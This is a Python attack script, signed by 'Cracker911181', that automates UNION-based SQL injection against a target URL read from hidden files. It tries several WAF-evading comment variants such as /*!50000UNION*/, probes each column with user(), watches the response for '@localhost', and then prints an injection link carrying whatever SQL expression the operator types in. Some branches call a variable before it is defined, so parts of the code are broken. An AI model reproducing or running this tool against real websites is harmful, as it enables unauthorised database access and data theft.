# Coded by Cracker
# CRACKER911181
 

import requests
import sys



#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest



##########

print(blue+"\n\n[+]Checking Vulnerable Column\n"+yellow)
######## open file ########

clmn=open(".colomn.txt","r")
colmn=clmn.read()

url=open(".link.txt","r")
link=url.read()

smbl=open(".smbl.txt","r")
symbol=smbl.read()

lin=open(".union.txt","r")
url_uni=lin.read()

######################

colomn=int(colmn)

######################

smbl1=symbol[0]
smbl2=symbol[1:]
#######how much colomn #######

unin=[ ]
now_clmn=1
for i in range(colomn):
	now_colomn=str(now_clmn)
	only_colomn=str(now_clmn-1)
	print("[=] Now Checking Column : "+only_colomn)
	unin.append(now_colomn)
	
	now_clmn=now_clmn+1

unnin=list((unin))
uniion=(",".join(unnin))
ex_union=str(uniion)

###########################

selct=1
for i in range(colomn):
	select=str(selct)
	unnin=list((unin))
	union=ex_union.replace(select,"user()")
	
	
	
	if smbl1=="'":
		
		if "/*!50000UNION/**_**/*/" in url_uni:
			real_link1=str(link+smbl1+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+smbl2)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link1.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link1.replace("user()",input))
				sys.exit()
		
		elif "/*!50000UNION*/" in url_uni:
			real_link2=str(link+smbl1+"+AND+0+/*!50000UNION*/+SELECT+"+union+smbl2)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link2.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link2.replace("user()",input))
				sys.exit()
				
		else:
			real_link=str(link+smbl1+"+AND+0+UNION+SELECT+"+union+smbl2)
			
			resp1=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp1:
				print(real_link.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link.replace("user()",input))
				sys.exit()


	else:
		
		if "/*!50000UNION/**_**/*/" in url_uni:
			real_link1=str(link+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+symbol)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link1.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link1.replace("user()",input))
				sys.exit()
		
		elif "/*!50000UNION*/" in url_uni:
			real_link2=str(link+"+AND+0+/*!50000UNION*/+SELECT+"+union+symbol)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link2.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link2.replace("user()",input))
				sys.exit()
				
		else:
			real_link=str(link+"+AND+0+UNION+SELECT+"+union+symbol)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link.replace("user()",input))
				sys.exit()


	selct=selct+1